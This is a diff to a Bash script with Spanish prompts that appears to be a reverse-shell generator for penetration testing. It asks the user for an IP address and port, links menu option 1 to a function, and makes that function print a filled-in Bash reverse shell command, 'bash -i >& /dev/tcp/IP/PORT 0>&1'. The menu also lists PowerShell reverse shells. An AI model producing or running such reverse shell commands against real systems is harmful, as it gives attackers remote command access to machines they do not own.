@@ -16,6 +16,17 @@ turquois="\e[0;36m\033[1m"
 gray="\e[0;37m\033[1m"
 bold="\e[1m"
 
+# FLUJO
+declare aipi
+declare portk
+echo -e "${red}$ Ingresa tu IP${end}${green}"
+read ipe
+echo -e "${end}${red}$ Ingresa un puerto${end}${green}"
+read portt
+aipi=$ipe
+portk=$portt
+
+
 
 # SALIR
 trap ctrl_c INT
@@ -63,7 +74,7 @@ function menu(){
         echo -e "${turquois}8)${end}${yellow} Powershell reverse shells${end}"
         read opc
         case $opc in
-            #1)
+            1) bashm; opt=1;;
             #2)
             #3)
             #4)
@@ -80,13 +91,8 @@ function menu(){
 
 function bashm(){
     clear
-    echo -e "${green}bash -i >& /dev/tcp/${red}YOUR_IP${end}${green}/${end}${red}YOUR_PORT${end}${green} 0>&1${end}"
+    echo -e "${green}bash -i >& /dev/tcp/$aipi/$portk 0>&1${end}"
 
 }
 
-# FLUJO
-echo -e "${red}$ Ingresa tu IP${end}${green}"
-read $ip
-echo -e "${end}${red}$ Ingresa un puerto${end}${green}"
-read $port
 menu
